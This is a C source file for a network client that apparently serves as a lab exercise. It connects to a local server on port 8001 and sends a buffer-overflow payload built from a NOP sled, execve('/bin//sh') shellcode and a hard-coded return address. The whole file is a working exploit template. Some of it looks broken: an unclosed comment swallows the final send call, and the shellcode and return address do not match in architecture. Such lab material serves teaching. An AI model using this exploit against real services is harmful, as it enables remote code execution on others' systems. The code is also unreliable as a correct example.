/* A client */
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdio.h>
#include <errno.h>
#include <netdb.h>
#include <time.h>

#define	PORTNUM	8001
#define	BLENGTH	128
#define	ALENGTH	32

#define OFFSET 40

/* the correct shellcode size = 22 */
char shellcode[]=
			"\x31\xF6\x56\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x53\x54\x5F\xF7\xEE\xB0\x3B\x0F\x05";
;

loop(int s)
{
  char buffer[BLENGTH];
  char name[ALENGTH] = "Jimmy";
  
  /* Send name to server */
  send(s, name, ALENGTH, 0);

  for (;;) {

    /* Receive prompt */
    if (recv(s, (void *)buffer, BLENGTH, 0) != BLENGTH) {
      break;
    }	
    int i;

      
    
    /* Simulate the fact the user type 1 */
    strncpy(buffer, "1\n", sizeof(buffer)-1);
    buffer[sizeof(buffer)-1] = '\0';
    

	/* send user response */
    send(s, (void *)buffer, BLENGTH, 0); 
    
	
	// NOPS in the buffer
    for(i = 0 ; i < 15 ; i++ ) buffer[i] = 0x90; 
	
	// Shellcode at the middle of the buffer
    memcpy(buffer+14, shellcode, strlen(shellcode));  
	
	/* return addr at the end of the buffer. */
	memcpy(buffer+36, "\x38\x33\xdc\xb7", 4);
	
	/* So our payload looks like : 
	*  _____________________________________________
	* | NOPS	|	shellcode	|	return addr		|
	* |____14____|________22_____|______4____________|
	*  0		13-14			35	36				39/
	

    /* Send user response */
    send(s, (void *)buffer, BLENGTH, 0);
  }
}

int
main(void)
{
  struct sockaddr_in server;
  struct hostent *host;
  int s;

  /* Create an Internet family, stream socket */
  s = socket(AF_INET, SOCK_STREAM, 0);
  if (s < 0) {
    perror("socket()");
    exit(EXIT_FAILURE);
  }

  /* Server listening on localhost interface */
  if ((host = gethostbyname("localhost")) == NULL) {
    perror("gethostbyname()");
    exit(EXIT_FAILURE);
  }

  /* Fill in socket address */
  memset((char *)&server, '\0', sizeof (server));
  server.sin_family = AF_INET;
  server.sin_port = htons(PORTNUM);
  memcpy((char *)&server.sin_addr, host->h_addr_list[0], host->h_length);

  /* Connect to server */
  if (connect(s, (struct sockaddr *)&server, sizeof (server)) < 0) {
    perror("connect()");
    exit(EXIT_FAILURE);
  }

  /* Talk to server */
  loop(s);

  /* Close the socket */
  close(s);

  return (0);
}
